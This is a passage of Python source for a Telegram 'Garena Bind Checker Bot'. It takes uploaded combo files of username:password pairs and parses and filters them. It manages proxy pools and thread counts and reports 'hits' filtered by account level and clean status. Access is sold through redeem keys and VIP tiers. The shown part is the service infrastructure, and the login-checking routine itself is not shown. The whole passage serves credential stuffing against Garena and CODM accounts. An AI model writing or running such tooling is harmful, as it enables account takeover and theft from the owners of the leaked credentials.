        return False

def _setup_wizard() -> dict:
    """
    Interactive first-run setup wizard.
    Asks for bot token and owner Telegram ID, validates both,
    then saves to config.json so future runs skip this step.
    """
    print("\n\033[1;96m╔══════════════════════════════════════════════════╗\033[0m")
    print("\033[1;96m║        🤖  FIRST-RUN SETUP WIZARD               ║\033[0m")
    print("\033[1;96m╚══════════════════════════════════════════════════╝\033[0m\n")
    print("\033[93mNo config.json found — let\'s set up your bot now.\033[0m\n")

    # ── Bot Token ────────────────────────────────────────────────
    while True:
        token = input("\033[1;37m🔑 Enter your Bot Token (from @BotFather):\033[0m\n> ").strip()
        if not token:
            print("\033[91m❌ Token cannot be empty. Try again.\033[0m\n")
            continue
        print("\033[93m⏳ Validating token...\033[0m")
        if _validate_token(token):
            try:
                r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
                bot_info = r.json().get("result", {})
                bot_name = bot_info.get("first_name", "")
                bot_user = bot_info.get("username", "")
                print(f"\033[92m✅ Token valid! Bot: {bot_name} (@{bot_user})\033[0m\n")
            except Exception:
                print("\033[92m✅ Token valid!\033[0m\n")
            break
        else:
            print("\033[91m❌ Invalid token or Telegram unreachable. Check your token and try again.\033[0m\n")

    # ── Owner Telegram ID ────────────────────────────────────────
    print("\033[93mℹ️  To find your Telegram ID, message @userinfobot on Telegram.\033[0m")
    while True:
        owner_id_str = input("\n\033[1;37m🆔 Enter your Telegram numeric ID (numbers only):\033[0m\n> ").strip()
        if not owner_id_str.lstrip("-").isdigit():
            print("\033[91m❌ Must be a number (e.g. 123456789). Try again.\033[0m")
            continue
        owner_id = int(owner_id_str)
        break

    # ── Owner Username (optional) ────────────────────────────────
    owner_username = input("\n\033[1;37m👤 Enter your Telegram username WITHOUT @ (or press Enter to skip):\033[0m\n> ").strip().lstrip("@")

    cfg = {
        "bot_token":       token,
        "owner_id":        owner_id,
        "owner_username":  owner_username,
    }
    _save_config(cfg)
    print("\n\033[1;92m🚀 Setup complete! Starting bot...\033[0m\n")
    return cfg

def _get_or_create_config() -> dict:
    """
    Load config from disk / env vars / KeyVault.
    If missing AND running interactively, run the setup wizard.
    If missing AND running on Railway (no stdin), wait for env vars instead of crashing.
    The bot will NEVER call sys.exit() — it stays alive and waits for configuration.
    """
    cfg = _load_config()
    needs_setup = (
        not cfg.get("bot_token") or
        not cfg.get("owner_id")
    )
    if not needs_setup:
        return cfg

    # Config is incomplete — check if we can run the setup wizard
    if _is_railway() or not sys.stdin.isatty():
        # ── Railway / no-TTY mode: cannot use input() ──
        # Instead of crashing, wait for environment variables to be set.
        # Railway will keep the process alive; once the user sets BOT_TOKEN
        # and OWNER_ID in the Railway dashboard, the next poll will pick them up.
        logger.warning("=" * 60)
        logger.warning("⚠️  BOT_TOKEN and/or OWNER_ID not configured!")
        logger.warning("   On Railway/cloud, set these environment variables:")
        logger.warning("     BOT_TOKEN    = your Telegram bot token")
        logger.warning("     OWNER_ID     = your Telegram numeric user ID")
        logger.warning("     OWNER_USERNAME = your Telegram username (optional)")
        logger.warning("     KEYSYSTEM_URL = KeyVault API URL (optional)")
        logger.warning("     KEYSYSTEM_ADMIN_SECRET = KeyVault admin secret (optional)")
        logger.warning("   Bot will wait and retry every 30 seconds...")
        logger.warning("=" * 60)
        print("\n\033[93m⚠️  BOT_TOKEN and OWNER_ID not configured!\033[0m")
        print("\033[93m   On Railway: set BOT_TOKEN and OWNER_ID environment variables.\033[0m")
        print("\033[93m   Bot will wait and retry every 30 seconds...\033[0m\n")
        # Wait loop — keep checking for env vars instead of exiting
        while True:
            time.sleep(30)
            env_cfg = _env_config()
            if env_cfg.get("bot_token") and env_cfg.get("owner_id"):
                # Env vars are now set — merge and return
                cfg.update(env_cfg)
                logger.info("[CONFIG] ✅ Environment variables detected — starting bot!")
                # Also save to config.json for next time
                _save_config(cfg)
                return cfg
            # Also try KeyVault API each cycle
            try:
                api = _get_keysystem_api()
                if api and api.enabled:
                    remote_cfg = api.load_state("bot_config")
                    if isinstance(remote_cfg, dict) and remote_cfg.get("bot_token") and remote_cfg.get("owner_id"):
                        for k, v in remote_cfg.items():
                            if k not in cfg or not cfg[k]:
                                cfg[k] = v
                        logger.info("[CONFIG] ✅ KeyVault config detected — starting bot!")
                        _save_config(cfg)
                        return cfg
            except Exception:
                pass
            logger.debug("[CONFIG] Still waiting for BOT_TOKEN and OWNER_ID...")
    else:
        # ── Interactive mode: run setup wizard ──
        cfg = _setup_wizard()
    return cfg

# Load (or create) config at startup
_cfg        = _get_or_create_config()
BOT_TOKEN   = _cfg.get("bot_token", "")

COMBO_LINE_LIMIT = 1000   # max lines allowed per upload

# _bot_pending tracks partial file upload state
_bot_pending : dict = {}


# ── low-level Telegram helpers ─────────────────────────────────
# Single reused session for all outbound Telegram API calls
_tg_session = requests.Session()
_tg_session.mount("https://", requests.adapters.HTTPAdapter(
    pool_connections=4, pool_maxsize=10, max_retries=0
))

# ── Dedicated session ONLY for answerCallbackQuery — never blocked by other calls ──
_tg_cb_session = requests.Session()
_tg_cb_session.mount("https://", requests.adapters.HTTPAdapter(
    pool_connections=2, pool_maxsize=6, max_retries=0
))

def _tg_api(token: str, method: str, **kwargs):
    """
    Call a Telegram Bot API method.
    - Retries automatically on HTTP 429 (Too Many Requests) up to 3 times.
    - Logs Telegram-level errors (ok: false) so bugs surface in logs.
    - Returns the full parsed JSON dict on success, None on failure.
    """
    for attempt in range(3):
        try:
            r = _tg_session.post(
                f"https://api.telegram.org/bot{token}/{method}",
                json=kwargs,
                timeout=15,
            )
            if r.status_code == 429:
                # Rate-limited — honour Retry-After header if present
                retry_after = int(r.headers.get("Retry-After", 5))
                logger.warning(f"[BOT] {method} rate-limited — waiting {retry_after}s (attempt {attempt+1}/3)")
                time.sleep(retry_after)
                continue
            if r.status_code != 200:
                logger.warning(f"[BOT] {method} HTTP {r.status_code}: {r.text[:200]}")
                return None
            data = r.json()
            if not data.get("ok"):
                err = data.get("description", "unknown error")
                err_code = data.get("error_code", 0)
                # 400 bad request on edit (message not modified) is harmless — suppress
                if err_code not in (400,):
                    logger.warning(f"[BOT] {method} Telegram error [{err_code}]: {err}")
            return data
        except requests.exceptions.Timeout:
            logger.warning(f"[BOT] {method} timeout (attempt {attempt+1}/3)")
            time.sleep(2)
        except Exception as e:
            logger.warning(f"[BOT] {method} error: {e}")
            return None
    return None

def _tg_send(token: str, chat_id, text: str, parse_mode: str = "HTML"):
    """
    Send a text message. Auto-splits messages longer than 4096 chars
    (Telegram's hard limit) so nothing is silently truncated.
    Returns the API response of the LAST chunk sent.
    """
    MAX = 4096
    if len(text) <= MAX:
        return _tg_api(token, "sendMessage",
                       chat_id=chat_id, text=text, parse_mode=parse_mode)
    # Split on newline boundaries where possible
    chunks = []
    while len(text) > MAX:
        split_at = text.rfind("\n", 0, MAX)
        if split_at == -1:
            split_at = MAX
        chunks.append(text[:split_at])
        text = text[split_at:].lstrip("\n")
    if text:
        chunks.append(text)
    result = None
    for chunk in chunks:
        result = _tg_api(token, "sendMessage",
                         chat_id=chat_id, text=chunk, parse_mode=parse_mode)
    return result

def _tg_send_buttons(token: str, chat_id, text: str, buttons: list, parse_mode: str = "HTML"):
    """Send a message with an inline keyboard.
    buttons = [[{"text": "label", "callback_data": "data"}, ...], ...]  (rows of buttons)
    """
    keyboard = {"inline_keyboard": buttons}
    return _tg_api(token, "sendMessage",
                   chat_id=chat_id, text=text, parse_mode=parse_mode,
                   reply_markup=keyboard)

def _tg_answer_callback(token: str, callback_id: str, text: str = ""):
    """Acknowledge an inline button press (removes the loading spinner).
    Uses a dedicated session so it's never blocked by other in-flight API calls."""
    try:
        r = _tg_cb_session.post(
            f"https://api.telegram.org/bot{token}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": text},
            timeout=5,
        )
        if r.status_code != 200:
            logger.warning(f"[BOT] answerCallbackQuery HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        logger.warning(f"[BOT] answerCallbackQuery error: {e}")


def _tg_delete_message(token: str, chat_id, message_id: int):
    """Delete a single message silently (ignores errors if already deleted)."""
    try:
        _tg_session.post(
            f"https://api.telegram.org/bot{token}/deleteMessage",
            json={"chat_id": chat_id, "message_id": message_id},
            timeout=10,
        )
    except Exception:
        pass


def _tg_delete_messages_bulk(token: str, chat_id, message_ids: list):
    """Delete up to 100 messages at once using deleteMessages (Telegram Bot API 6.8+).
    Falls back to individual deletes if bulk endpoint fails."""
    if not message_ids:
        return
    # Telegram allows max 100 per call
    for i in range(0, len(message_ids), 100):
        chunk = message_ids[i:i + 100]
        try:
            r = _tg_session.post(
                f"https://api.telegram.org/bot{token}/deleteMessages",
                json={"chat_id": chat_id, "message_ids": chunk},
                timeout=15,
            )
            if r.status_code != 200:
                # Fallback: delete one by one
                for mid in chunk:
                    _tg_delete_message(token, chat_id, mid)
        except Exception:
            for mid in chunk:
                _tg_delete_message(token, chat_id, mid)

def _tg_edit_message(token: str, chat_id, message_id: int, text: str,
                     buttons: list = None, parse_mode: str = "HTML"):
    """Edit an existing message (optionally update its inline keyboard too).
    Silently ignores 'message is not modified' errors from Telegram."""
    payload = {"chat_id": chat_id, "message_id": message_id,
                "text": text, "parse_mode": parse_mode}
    if buttons is not None:
        payload["reply_markup"] = {"inline_keyboard": buttons}
    result = _tg_api(token, "editMessageText", **payload)
    # result may be None (e.g. message too old to edit) — that's fine
    return result


def _tg_set_commands(token: str):
    """
    Register bot commands in BotFather so users see a clean menu.

    • Default scope  (all users)  → only /help
    • Private scope  (owner only) → full admin command list

    This creates the 'Menu' button like in the screenshot.
    """
    # ── Commands visible to ALL users ─────────────────────────
    user_commands = [
        {"command": "start",  "description": "▶️ Start or restore your session"},
        {"command": "help",   "description": "📋 Show menu & your config"},
        {"command": "check",  "description": "📊 Live stats — level, country, server"},
        {"command": "redeem", "description": "🔑 Redeem an access key"},
        {"command": "reset",  "description": "🔄 Clear settings & reconfigure"},
        {"command": "stop",   "description": "🛑 Stop the running checker"},
    ]

    # ── Commands visible ONLY to the owner (private chat scope) ──
    admin_commands = [
        {"command": "help",           "description": "⚙️ Admin panel"},
        {"command": "check",          "description": "📊 Live stats — level, country, server"},
        {"command": "generate_key",   "description": "🔑 Generate a redeem key"},
        {"command": "statuskey",      "description": "📋 View all key statuses"},
        {"command": "deletekey",      "description": "🗑 Delete key(s)"},
        {"command": "keysystem",     "description": "🔗 Configure KeyVault API"},
        {"command": "upload_proxy",   "description": "📡 Upload proxy list"},
        {"command": "proxy_done",     "description": "✅ Finish proxy upload & save"},
        {"command": "proxystatus",    "description": "📊 View proxy pool status"},
        {"command": "testproxy",      "description": "🧪 Test proxy connectivity"},
        {"command": "deleteproxy",    "description": "🗑️ Delete all proxy files"},
        {"command": "renewproxy",    "description": "🔄 Renew proxies from worker"},
        {"command": "serverstatus",   "description": "🖥 Server load & limits"},
        {"command": "setthreads",    "description": "🔧 Set checker threads (e.g. /setthreads 10)"},
        {"command": "setmaxusers",    "description": "👥 Set max concurrent users (e.g. /setmaxusers 20)"},
        {"command": "add_coowner",    "description": "👥 Add a co-owner by Telegram ID"},
        {"command": "remove_coowner", "description": "👥 Remove a co-owner"},
        {"command": "stopall",        "description": "☢️ Stop ALL running checkers"},
        {"command": "broadcast",      "description": "📢 Send message to all users"},
        {"command": "resetconfig",    "description": "🔧 Re-run bot setup wizard"},
        {"command": "start",          "description": "▶️ Start / restore session"},
        {"command": "reset",          "description": "🔄 Clear settings"},
        {"command": "stop",           "description": "🛑 Stop running checker"},
        {"command": "redeem",         "description": "🔑 Redeem a key"},
    ]

    # Set default scope (all users)
    try:
        _tg_session.post(
            f"https://api.telegram.org/bot{token}/setMyCommands",
            json={"commands": user_commands,
                  "scope": {"type": "default"}},
            timeout=10,
        )
    except Exception as e:
        logger.warning(f"[BOT] setMyCommands (default) failed: {e}")

    # Set admin scope (owner's private chat + each co-owner)
    admin_ids = [OWNER_ID] + list(COOWNER_IDS)
    for admin_id in admin_ids:
        try:
            _tg_session.post(
                f"https://api.telegram.org/bot{token}/setMyCommands",
                json={"commands": admin_commands,
                      "scope": {"type": "chat", "chat_id": admin_id}},
                timeout=10,
            )
        except Exception as e:
            logger.warning(f"[BOT] setMyCommands (admin {admin_id}) failed: {e}")

def _tg_get_file_url(token: str, file_id: str):
    res = _tg_api(token, "getFile", file_id=file_id)
    if res and res.get("ok"):
        fp = res["result"].get("file_path")
        if fp:
            return f"https://api.telegram.org/file/bot{token}/{fp}"
    return None


# ── Garena credential validator ────────────────────────────────
import re as _re

_EMAIL_RE   = _re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")
_PHONE_RE   = _re.compile(r"^\+?[0-9]{7,15}$")
# Garena usernames: alphanumeric, dots, underscores, hyphens, 3-30 chars
_UNAME_RE   = _re.compile(r"^[a-zA-Z0-9._\-]{3,30}$")

def _is_garena_credential(username: str, password: str) -> bool:
    """
    Return True if the username looks like a valid Garena login.

    Garena accounts use one of:
      • Email address      → user@gmail.com
      • Phone number       → +639123456789 / 09123456789
      • Alphanumeric name  → johnsmith123 (3-30 chars, no spaces)

    Rejects obvious garbage:
      • Pure IP addresses  → 192.168.1.1
      • URLs               → http://... / www....
      • Very short (<3)    → a:b
      • Contains spaces
      • Looks like a proxy line that slipped through
    """
    u = username.strip()
    p = password.strip()

    if not u or not p:
        return False

    # Reject if username contains spaces (not a valid account name)
    if " " in u:
        return False

    # Reject pure IP addresses (proxy lines that leaked through)
    if _re.match(r"^\d{1,3}(\.\d{1,3}){3}$", u):
        return False

    # Reject URL-like usernames
    if u.lower().startswith(("http://", "https://", "www.")):
        return False

    # Reject hostnames with ports (proxy leak: host:port treated as user:pass)
    if _re.match(r"^[a-zA-Z0-9.\-]+:\d{2,5}$", u + ":" + p):
        return False
    if p.isdigit() and 2 <= len(p) <= 5 and "." in u:
        # Looks like  hostname.com : 8080 — proxy not credential
        return False

    # Accept email
    if _EMAIL_RE.match(u):
        return True

    # Accept phone number
    if _PHONE_RE.match(u):
        return True

    # Accept normal Garena username
    if _UNAME_RE.match(u):
        return True

    return False


# ── smart combo parser ─────────────────────────────────────────
def _parse_combo_lines(raw_lines: list) -> tuple:
    """
    Auto-detect format per line and extract only user:pass.
    Then validates each credential is a plausible Garena account.

    Handles:
      user:pass                    → kept as-is
      url:user:pass                → url stripped
      http(s)://...:user:pass      → url stripped
      url:port:user:pass           → url+port stripped
      user:pass:extra              → extra ignored

    Returns (clean_lines, skipped, fmt_counts)
    """
    url_re  = _re.compile(r"^https?://", _re.IGNORECASE)
    clean   = []
    seen    = set()
    skipped = 0
    not_garena = 0
    fmt     = {"plain": 0, "url_stripped": 0, "extra_stripped": 0}

    for raw in raw_lines:
        line = raw.strip()
        if not line or line.startswith("#") or line.startswith("==="):
            continue

        parts = line.split(":")

        u, p, tag = None, None, "plain"

        if len(parts) == 2:
            u, p = parts[0].strip(), parts[1].strip()
            tag  = "plain"

        elif len(parts) == 3:
            # url:user:pass  OR  user:pass:extra
            if url_re.match(parts[0]) or "." in parts[0] or parts[0].isdigit():
                u, p = parts[1].strip(), parts[2].strip()
                tag  = "url_stripped"
            else:
                u, p = parts[0].strip(), parts[1].strip()
                tag  = "extra_stripped"

        elif len(parts) >= 4:
            # url:port:user:pass — take last two
            u, p = parts[-2].strip(), parts[-1].strip()
            tag  = "url_stripped"

        else:
            skipped += 1
            continue

        if not u or not p:
            skipped += 1
            continue

        # ── Garena validation ──────────────────────────────────
        if not _is_garena_credential(u, p):
            not_garena += 1
            continue

        key = f"{u}:{p}"
        if key not in seen:
            seen.add(key)
            clean.append(key)
            fmt[tag] += 1

    # Attach not_garena count to fmt so caller can report it
    fmt["not_garena"] = not_garena
    return clean, skipped, fmt


# ══════════════════════════════════════════════════════════════
#  PER-USER SESSION STATE  (supports unlimited concurrent users)
# ══════════════════════════════════════════════════════════════
# State machine per chat_id:
#   AWAIT_LEVEL → AWAIT_FILTER → AWAIT_FILE → RUNNING
# (No AWAIT_ID step — Telegram ID is auto-detected from the message)
_bot_state   : dict = {}   # chat_id -> state string
_state_lock  = threading.Lock()
_user_data   : dict = {}   # chat_id -> { hits_id, username, level, clean_filter }
_udata_lock  = threading.Lock()
_saved_users : dict = {}   # username/chat_id -> saved profile (persisted across /start)
_saved_lock  = threading.Lock()

USERS_FILE = "bot_users.json"
ACTIVE_SESSIONS_FILE = "active_sessions.json"


def _load_saved_users(sync_api: bool = False):
    """Load saved user profiles — local file first, optionally sync from API."""
    global _saved_users
    # Try loading from local file first
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                _saved_users = json.load(f)
        except Exception:
            _saved_users = {}
    # Sync from KeyVault API (has latest data surviving redeploys)
    if sync_api:
        try:
            api = _get_keysystem_api()
            if api.enabled:
                remote = api.load_state("bot_users")
                if remote and isinstance(remote, dict):
                    for k, v in remote.items():
                        if k not in _saved_users:
                            _saved_users[k] = v
                    logger.info(f"[BOT] Synced {len(remote)} user profiles from KeyVault API")
        except Exception as e:
            logger.warning(f"[BOT] Could not sync users from API: {e}")

def _save_users_to_disk():
    """Persist all saved user profiles to disk AND sync to KeyVault API."""
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(_saved_users, f, indent=2)
    except Exception as e:
        logger.warning(f"[BOT] Could not save users to disk: {e}")
    # Also sync to KeyVault API for persistence across Railway redeploys
    try:
        if _keysystem_api and _keysystem_api.enabled:
            _keysystem_api.save_state("bot_users", _saved_users)
    except Exception:
        pass

# Load on startup (wrapped for Railway resilience)
try:
    _load_saved_users()
except Exception as _users_err:
    logging.getLogger(__name__).warning(f"[BOT] ⚠️  Could not load saved users: {_users_err}")


# ── Active session persistence for auto-resume on crash ────────
_active_sessions: dict = {}  # chat_id -> session info dict
_active_sessions_lock = threading.Lock()


def _save_active_session(chat_id, file_path: str, file_name: str, lines: list,
                         user_data: dict, progress: int = 0):
    """Persist an active checking session to disk for crash recovery.
    Also saves a copy of the combo file to saved_combos/ so it survives restarts."""
    # ── Save combo file to persistent directory ──
    os.makedirs(SAVED_COMBOS_DIR, exist_ok=True)
    persistent_path = os.path.join(SAVED_COMBOS_DIR, f"{chat_id}_{file_name}")
    try:
        with open(persistent_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + "\n")
    except Exception as e:
        logger.warning(f"[BOT] Could not save persistent combo for {chat_id}: {e}")
        persistent_path = file_path  # fallback to original path

    with _active_sessions_lock:
        _active_sessions[str(chat_id)] = {
            "chat_id": chat_id,
            "file_path": file_path,
            "persistent_path": persistent_path,
            "file_name": file_name,
            "total_lines": len(lines),
            "progress": progress,
            "level": user_data.get("level", [1]),
            "clean_filter": user_data.get("clean_filter", "both"),
            "hits_id": user_data.get("hits_id", chat_id),
            "username": user_data.get("username", ""),
            "combo_limit": user_data.get("combo_limit", COMBO_LINE_LIMIT),
            "started_at": time.time(),
        }
        _flush_active_sessions()


def _update_session_progress(chat_id, progress: int):
    """Update the progress counter for an active session."""
    with _active_sessions_lock:
        key = str(chat_id)
        if key in _active_sessions:
            _active_sessions[key]["progress"] = progress
            _flush_active_sessions()


def _remove_active_session(chat_id, delete_combo=True):
    """Remove a completed/stopped session from disk.
    Also removes the persistent combo file unless delete_combo=False."""
    key = str(chat_id)
    with _active_sessions_lock:
        sess = _active_sessions.pop(key, None)
        _flush_active_sessions()
    # Clean up persistent combo file
    if delete_combo and sess:
        ppath = sess.get("persistent_path", "")
        if ppath and os.path.exists(ppath):
            try:
                os.remove(ppath)
                logger.debug(f"[BOT] Removed persistent combo: {ppath}")
            except Exception:
                pass
        # Also try the default naming pattern
        fname = sess.get("file_name", "")
        if fname:
            default_path = os.path.join(SAVED_COMBOS_DIR, f"{chat_id}_{fname}")
            if os.path.exists(default_path) and default_path != ppath:
                try:
                    os.remove(default_path)
                except Exception:
                    pass


def _flush_active_sessions():
    """Write active sessions to disk AND sync to API (called under lock)."""
    try:
        with open(ACTIVE_SESSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(_active_sessions, f, indent=2)
    except Exception as e:
        logger.warning(f"[BOT] Could not save active sessions: {e}")
    # Sync to KeyVault API for persistence across Railway redeploys
    try:
        if _keysystem_api and _keysystem_api.enabled:
            _keysystem_api.save_state("active_sessions", _active_sessions)
    except Exception:
        pass


def _load_active_sessions() -> dict:
    """Load active sessions — try local first, merge from API."""
    result = {}
    if os.path.exists(ACTIVE_SESSIONS_FILE):
        try:
            with open(ACTIVE_SESSIONS_FILE, "r", encoding="utf-8") as f:
                result = json.load(f)
        except Exception:
            pass
    # Also check API for sessions saved before redeploy
    try:
        if _keysystem_api and _keysystem_api.enabled:
            remote = _keysystem_api.load_state("active_sessions")
            if remote and isinstance(remote, dict):
                for k, v in remote.items():
                    if k not in result:
                        result[k] = v
    except Exception:
        pass
    return result


def _udata(chat_id) -> dict:
    """Get or create in-memory user session data for a chat_id. Thread-safe."""
    with _udata_lock:
        if chat_id not in _user_data:
            _user_data[chat_id] = {
                "hits_id":      chat_id,
                "username":     "",
                "level":        [1],
                "clean_filter": "both",
            }
        return _user_data[chat_id]


def _get_saved_profile(key: str) -> dict | None:
    """Return saved profile by string key (str(chat_id) or username). Thread-safe."""
    with _saved_lock:
        return _saved_users.get(str(key))


def _save_profile(chat_id, d: dict):
    """Save a user profile keyed by both chat_id and username. Thread-safe."""
    with _saved_lock:
        key = str(chat_id)
        _saved_users[key] = {
            "hits_id":      d["hits_id"],
            "username":     d.get("username", ""),
            "level":        d["level"],
            "clean_filter": d["clean_filter"],
            "key":          d.get("key"),
            "key_expires":  d.get("key_expires", 0),
            "combo_limit":  d.get("combo_limit", COMBO_LINE_LIMIT),
            "key_tier":     d.get("key_tier", "free"),
        }
        if d.get("username"):
            _saved_users[d["username"].lstrip("@").lower()] = _saved_users[key]
    _save_users_to_disk()


# ── /start — auto-detects Telegram ID, skips manual ID entry ───
def _handle_start(token: str, chat_id, from_user: dict):
    name     = from_user.get("first_name", "User")
    username = from_user.get("username", "")
    tg_id    = from_user.get("id", chat_id)   # real Telegram user ID

    # Check if this user has a saved profile
    saved = _get_saved_profile(str(tg_id)) or (
        _get_saved_profile(username.lower()) if username else None
    )

    if saved:
        # Restore saved profile
        d = _udata(chat_id)
        d["hits_id"]      = saved["hits_id"]
        d["username"]     = saved.get("username", username)
        d["level"]        = saved["level"]
        d["clean_filter"] = saved["clean_filter"]
        d["key"]          = saved.get("key")
        d["key_expires"]  = saved.get("key_expires", 0)
        d["combo_limit"]  = saved.get("combo_limit", COMBO_LINE_LIMIT)
        d["key_tier"]     = saved.get("key_tier", "free")

        lvl_label  = "ALL levels" if d["level"] == [1] else f"Level {d['level'][0]}+"
        cf_map     = {"clean": "✅ CLEAN only", "notclean": "❌ NOT CLEAN only", "both": "🔄 BOTH"}
        cf_label   = cf_map.get(d["clean_filter"], "🔄 BOTH")
        user_limit = d.get("combo_limit", COMBO_LINE_LIMIT)
        is_vip = _is_vip_user(chat_id)
        limit_disp = "∞ unlimited" if (_is_owner(from_user) or is_vip) else f"{user_limit} lines"
        vip_badge = " ⭐ VIP" if is_vip else ""

        _bot_state[chat_id] = "AWAIT_FILE"
        # Clear any proxy-paused state from previous session
        _unregister_proxy_paused(chat_id)

        _tg_send(token, chat_id,
            f"👋 <b>Welcome back, {name}!</b>{vip_badge}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  🆔 Hits ID:  <code>{d['hits_id']}</code>\n"
            f"  🎮 Level:    <code>{lvl_label}</code>\n"
            f"  🔍 Hit type: <code>{cf_label}</code>\n"
            f"  📦 Limit:    <code>{limit_disp}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📂 <b>Upload your combo file to start!</b>\n\n"
            f"<i>Use /reset to change your settings.</i>"
        )
        return

    # New user — auto-save their Telegram ID, skip asking
    d = _udata(chat_id)
    d["hits_id"]  = tg_id
    d["username"] = username
    uname_line = f"👤 @{username}\n" if username else ""

    _tg_send(token, chat_id,
        f"👋 <b>Welcome, {name}!</b>\n\n"
        f"🤖 <b>Garena Bind Checker Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"✅ <b>Telegram ID auto-detected:</b>\n"
        f"  🆔 <code>{tg_id}</code>\n"
        f"{uname_line}"
        f"  📩 Hits will be sent here.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<i>Now choose your settings below 👇</i>"
    )
    _ask_level(token, chat_id)


# ── Inline level picker ────────────────────────────────────────
def _ask_level(token: str, chat_id, intro: str = ""):
    """Send the level selection as inline buttons."""
    _bot_state[chat_id] = "AWAIT_LEVEL"
    _tg_send_buttons(token, chat_id,
        f"{intro}"
        f"🎮 <b>Step 1 of 2 — Level Filter</b>\n\n"
        f"Which account levels should trigger a hit?\n\n"
        f"<i>Tap to choose:</i>",
        [
            [
                {"text": "⭐ Level 100+", "callback_data": "lvl:100"},
                {"text": "⭐⭐ Level 200+","callback_data": "lvl:200"},
            ],
            [
                {"text": "⭐⭐⭐ Level 300+","callback_data": "lvl:300"},
                {"text": "🔥 Level 400+",  "callback_data": "lvl:400"},
            ],
            [
                {"text": "🌍 ALL Levels",  "callback_data": "lvl:all"},
            ],
        ]
    )


def _ask_filter(token: str, chat_id, lvl_label: str):
    """Send the hit-type filter as inline buttons."""
    _bot_state[chat_id] = "AWAIT_FILTER"
    _tg_send_buttons(token, chat_id,
        f"✅ <b>Level:</b> <code>{lvl_label}</code>\n\n"
        f"🔍 <b>Step 2 of 2 — Hit Type</b>\n\n"
        f"Which accounts should send you a notification?\n\n"
        f"<i>Tap to choose:</i>",
        [
            [
                {"text": "✅ CLEAN only",     "callback_data": "flt:clean"},
                {"text": "❌ NOT CLEAN only", "callback_data": "flt:notclean"},
            ],
            [
                {"text": "🔄 BOTH",           "callback_data": "flt:both"},
            ],
        ]
    )


# ── Step 2: receive level choice (text fallback) ───────────────
def _handle_level(token: str, chat_id, text: str):
    level_map = {
        "1": ([100],  "Level 100+"),
        "2": ([200],  "Level 200+"),
        "3": ([300],  "Level 300+"),
        "4": ([400],  "Level 400+"),
        "5": ([1],    "ALL levels"),
    }
    choice = text.strip()
    if choice not in level_map:
        _ask_level(token, chat_id)
        return

    thresholds, label = level_map[choice]
    d = _udata(chat_id)
    d["level"] = thresholds
    _ask_filter(token, chat_id, label)


# ── Step 3: receive filter choice (text fallback) ──────────────
def _handle_filter(token: str, chat_id, text: str):
    filter_map = {
        "1": ("clean",    "✅ CLEAN only"),
        "2": ("notclean", "❌ NOT CLEAN only"),
        "3": ("both",     "🔄 BOTH"),
    }
    choice = text.strip()
    if choice not in filter_map:
        _ask_filter(token, chat_id, "—")
        return

    cf_value, cf_label = filter_map[choice]
    d = _udata(chat_id)
    d["clean_filter"] = cf_value
    _bot_state[chat_id] = "AWAIT_FILE"
    _save_profile(chat_id, d)

    lvl_label  = "ALL levels" if d["level"] == [1] else f"Level {d['level'][0]}+"
    user_limit = d.get("combo_limit", COMBO_LINE_LIMIT)

    _tg_send(token, chat_id,
        f"✅ <b>Config saved!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  🆔 Hits ID:  <code>{d['hits_id']}</code>\n"
        f"  🎮 Level:    <code>{lvl_label}</code>\n"
        f"  🔍 Hit type: <code>{cf_label}</code>\n"
        f"  📦 Limit:    <code>{user_limit} lines</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📂 <b>Upload your combo file to start!</b>\n\n"
        f"<i>Use /reset to change settings.</i>\n\n"
        f"<i>Send your file now ⬇️</i>"
    )


# ── Step 4: file upload ────────────────────────────────────────
def _handle_file(token: str, chat_id, message: dict, from_user: dict = None):
    # Clear any previous proxy-paused state for this user (they're re-uploading)
    _unregister_proxy_paused(chat_id)

    document = message.get("document")
    if not document:
        _tg_send(token, chat_id,
            "⚠️ Please upload your combo file as a document.\n"
            "<i>Accepted: any .txt containing garena or codm in name.</i>\n"
            "e.g. garena.txt · codm.txt · Yuki_garena.txt")
        return

    file_name: str = document.get("file_name", "combo.txt")
    file_size: int = document.get("file_size", 0)  # Telegram provides size in bytes
    MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB limit

    # ── File size check ──────────────────────────────────────
    if file_size > MAX_FILE_SIZE:
        size_mb = file_size / (1024 * 1024)
        _tg_send(token, chat_id,
            f"❌ <b>File too large!</b>\n\n"
            f"Your file <code>{file_name}</code> is <b>{size_mb:.1f} MB</b>.\n"
            f"Maximum allowed: <b>5 MB</b>\n\n"
            f"<i>Please split your file into smaller parts and try again.</i>")
        return

    # ── Smart filename detection ───────────────────────────────
    # Accept any .txt file whose name contains "garena" or "codm"
    # (case-insensitive). Examples that pass:
    #   garena.txt  codm.txt  codm1.txt  Yuki_garena.txt
    #   codm_garena.txt  my_codm_list.txt  GARENA_PH.txt
    _fname_lower = file_name.lower()
    _fname_stem  = os.path.splitext(_fname_lower)[0]  # strip .txt
    _valid_file  = (
        _fname_lower.endswith(".txt") and
        ("garena" in _fname_stem or "codm" in _fname_stem)
    )
    if not _valid_file:
        _tg_send(token, chat_id,
            f"❌ <b>File not accepted:</b> <code>{file_name}</code>\n\n"
            f"Your filename must contain <b>garena</b> or <b>codm</b>.\n\n"
            f"✅ <b>Accepted examples:</b>\n"
            f"  • <code>garena.txt</code>\n"
            f"  • <code>codm.txt</code>\n"
            f"  • <code>codm1.txt</code>\n"
            f"  • <code>Yuki_garena.txt</code>\n"
            f"  • <code>codm_garena.txt</code>\n"
            f"  • <code>my_codm_list.txt</code>\n\n"
